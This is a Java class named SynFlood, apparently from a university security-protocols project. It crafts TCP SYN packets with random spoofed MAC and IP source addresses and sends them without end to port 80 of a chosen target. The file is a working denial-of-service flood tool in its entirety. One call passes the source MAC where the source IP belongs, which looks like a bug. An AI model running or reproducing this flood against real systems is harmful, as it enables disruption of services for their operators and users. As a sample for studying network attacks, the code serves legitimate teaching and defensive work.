package com.upec.securityProtocols.attacks;

import org.jnetpcap.protocol.network.Ip4.Ip4Type;

import com.upec.securityProtocols.communications.Output;
import com.upec.securityProtocols.communications.Packet;
import com.upec.securityProtocols.communications.PcapUtils;

public class SynFlood implements Runnable {
    private byte[]macAddress;
    private byte[]ipAddress;
    private Output out;
    
    public SynFlood(byte[]mac, byte[]ip, Output out){
        this.macAddress=mac;
        this.ipAddress=ip;
        this.out=out;
    }

    public Packet makeSYN(byte[] sourceMac, byte[]sourceIp ){
        Packet syn=new Packet( 66 );
        syn.addEthernetHeader( sourceMac, macAddress, 0x0800 );
        
        syn.addIPHeader( sourceMac, ipAddress, Ip4Type.TCP );
        syn.addTcpHeader( 0, 80, 100, 0, 2 );
        return syn;
    }
    
    @Override
    public void run() {
        while(true){
            out.sendPacket( makeSYN( PcapUtils.randomMACAddress(), PcapUtils.randomIpV4ddress() ) );
        }
    }   
}
